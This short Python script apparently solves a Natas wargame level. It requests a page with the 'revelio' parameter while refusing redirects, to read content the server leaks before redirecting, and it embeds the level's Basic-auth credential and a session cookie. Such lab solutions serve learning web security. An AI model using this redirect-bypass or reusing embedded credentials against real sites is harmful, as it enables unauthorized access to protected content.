#!/usr/bin/env python3
import requests

natas22_url = "http://natas22.natas.labs.overthewire.org/index.php?revelio"

natas22_cookies = {"PHPSESSID": "6u546bqal5ngq6rakp07pd6u51"}

natas22_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg==", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

res = requests.get(natas22_url, headers=natas22_headers, cookies=natas22_cookies, allow_redirects=False)
print(res.text)
